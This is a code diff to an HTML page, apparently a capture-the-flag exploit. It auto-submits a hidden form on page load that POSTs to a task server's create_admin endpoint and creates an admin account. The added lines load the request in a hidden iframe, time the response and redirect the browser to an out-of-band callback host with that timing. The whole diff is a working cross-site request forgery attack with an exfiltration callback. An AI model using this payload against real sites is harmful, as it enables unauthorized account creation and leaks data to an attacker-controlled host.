@@ -2,14 +2,26 @@
 <html>
 <body>
 
+<iframe name="sink" style="display:none"></iframe>
+
 <form id="f"
   action="https://tasks.goidactf.ru:20199/create_admin"
-  method="POST">
+  method="POST"
+  target="sink">
   <input type="hidden" name="new_admin_login" value="ctfadmin">
 </form>
 
 <script>
-window.onload = function () {
+window.onload = () => {
+  const t0 = Date.now();
+  const frame = document.getElementsByName("sink")[0];
+
+  frame.onload = () => {
+    const delta = Date.now() - t0;
+    location.href =
+      "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/loaded_" + delta;
+  };
+
   document.getElementById("f").submit();
 };
 </script>
